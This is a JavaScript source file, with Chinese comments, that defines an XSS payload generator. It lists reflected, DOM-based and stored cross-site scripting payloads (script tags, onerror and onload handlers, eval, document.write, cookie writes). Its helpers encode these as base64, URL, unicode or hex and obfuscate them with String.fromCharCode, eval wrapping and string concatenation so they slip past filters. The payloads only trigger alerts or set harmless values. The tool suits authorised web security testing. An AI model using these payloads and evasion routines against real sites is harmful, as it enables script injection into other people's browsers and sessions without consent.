class PayloadGenerator {
    constructor() {
        // 定义基础payload
        this.basePayloads = {
            reflected: [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<div onmouseover=alert(1)>hover me</div>'
            ],
            dom: [
                '<script>document.body.innerHTML="<img src=x onerror=alert(1)>";</script>',
                '<script>document.write("<img src=x onerror=alert(1)>");</script>',
                '<script>eval("alert(1)");</script>'
            ],
            stored: [
                '<script>localStorage.setItem("xss", "1");</script>',
                '<script>sessionStorage.setItem("xss", "1");</script>',
                '<script>document.cookie = "xss=1";</script>'
            ]
        };

        // 定义编码方法
        this.encodingMethods = {
            base64: this.base64Encode.bind(this),
            url: this.urlEncode.bind(this),
            html: this.htmlEncode.bind(this),
            js: this.jsEncode.bind(this),
            unicode: this.unicodeEncode.bind(this),
            hex: this.hexEncode.bind(this)
        };

        // 定义混淆方法
        this.obfuscationMethods = {
            string: this.obfuscateString.bind(this),
            eval: this.obfuscateEval.bind(this),
            concat: this.obfuscateConcat.bind(this),
            template: this.obfuscateTemplate.bind(this)
        };
    }

    // 生成payload
    generatePayload(type, context, options = {}) {
        const payload = {
            original: null,
            encoded: null,
            obfuscated: null,
            variants: []
        };

        try {
            // 选择基础payload
            payload.original = this.selectBasePayload(type, context);

            // 应用编码
            if (options.encoding) {
                payload.encoded = this.applyEncoding(payload.original, options.encoding);
            }

            // 应用混淆
            if (options.obfuscation) {
                payload.obfuscated = this.applyObfuscation(payload.original, options.obfuscation);
            }

            // 生成变体
            if (options.variants) {
                payload.variants = this.generateVariants(payload.original, options.variants);
            }

            return payload;
        } catch (error) {
            console.error('Payload generation error:', error);
            return null;
        }
    }

    // 选择基础payload
    selectBasePayload(type, context) {
        if (!this.basePayloads[type]) {
            throw new Error(`Invalid payload type: ${type}`);
        }

        // 根据上下文选择合适的payload
        const payloads = this.basePayloads[type];
        let selectedPayload = payloads[0];

        // 根据上下文调整payload
        if (context.type.includes('html')) {
            selectedPayload = payloads.find(p => p.includes('<script>') || p.includes('onerror='));
        } else if (context.type.includes('javascript')) {
            selectedPayload = payloads.find(p => p.includes('eval(') || p.includes('document.write'));
        } else if (context.type.includes('css')) {
            selectedPayload = payloads.find(p => p.includes('style=') || p.includes('expression('));
        }

        return selectedPayload || payloads[0];
    }

    // 应用编码
    applyEncoding(payload, encoding) {
        if (!this.encodingMethods[encoding]) {
            throw new Error(`Invalid encoding method: ${encoding}`);
        }

        return this.encodingMethods[encoding](payload);
    }

    // 应用混淆
    applyObfuscation(payload, obfuscation) {
        if (!this.obfuscationMethods[obfuscation]) {
            throw new Error(`Invalid obfuscation method: ${obfuscation}`);
        }

        return this.obfuscationMethods[obfuscation](payload);
    }

    // 生成变体
    generateVariants(payload, options) {
        const variants = [];

        // 生成编码变体
        if (options.encoding) {
            for (const [name, method] of Object.entries(this.encodingMethods)) {
                variants.push({
                    type: 'encoding',
                    method: name,
                    payload: method(payload)
                });
            }
        }

        // 生成混淆变体
        if (options.obfuscation) {
            for (const [name, method] of Object.entries(this.obfuscationMethods)) {
                variants.push({
                    type: 'obfuscation',
                    method: name,
                    payload: method(payload)
                });
            }
        }

        return variants;
    }

    // 编码方法
    base64Encode(payload) {
        return btoa(payload);
    }

    urlEncode(payload) {
        return encodeURIComponent(payload);
    }

    htmlEncode(payload) {
        return payload
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;')
            .replace(/\//g, '&#x2F;');
    }

    jsEncode(payload) {
        return payload
            .replace(/\\/g, '\\\\')
            .replace(/'/g, '\\\'')
            .replace(/"/g, '\\"')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t');
    }

    unicodeEncode(payload) {
        return payload.split('').map(char => 
            '\\u' + char.charCodeAt(0).toString(16).padStart(4, '0')
        ).join('');
    }

    hexEncode(payload) {
        return payload.split('').map(char => 
            '\\x' + char.charCodeAt(0).toString(16).padStart(2, '0')
        ).join('');
    }

    // 混淆方法
    obfuscateString(payload) {
        return payload.split('').map(char => 
            `String.fromCharCode(${char.charCodeAt(0)})`
        ).join('+');
    }

    obfuscateEval(payload) {
        return `eval(${this.obfuscateString(payload)})`;
    }

    obfuscateConcat(payload) {
        return payload.split('').map(char => 
            `"${char}"`
        ).join('+');
    }

    obfuscateTemplate(payload) {
        return `\`${payload}\``;
    }

    // 验证payload
    validatePayload(payload) {
        const validation = {
            valid: true,
            issues: [],
            recommendations: []
        };

        // 检查基本语法
        if (payload.includes('<script>')) {
            validation.issues.push('Script tag detected');
            validation.recommendations.push('Consider using event handlers instead');
        }

        // 检查事件处理器
        if (payload.match(/on\w+\s*=/i)) {
            validation.issues.push('Event handler detected');
            validation.recommendations.push('Consider using data attributes');
        }

        // 检查编码
        if (payload.includes('\\u') || payload.includes('\\x')) {
            validation.issues.push('Encoded characters detected');
            validation.recommendations.push('Consider using plain text');
        }

        // 检查混淆
        if (payload.includes('eval(') || payload.includes('Function(')) {
            validation.issues.push('Obfuscated code detected');
            validation.recommendations.push('Consider using clear code');
        }

        validation.valid = validation.issues.length === 0;

        return validation;
    }

    // 生成payload报告
    generatePayloadReport(payload, validation) {
        return {
            timestamp: new Date().toISOString(),
            payload: payload,
            validation: validation,
            recommendations: validation.recommendations
        };
    }
}

export const payloadGenerator = new PayloadGenerator(); 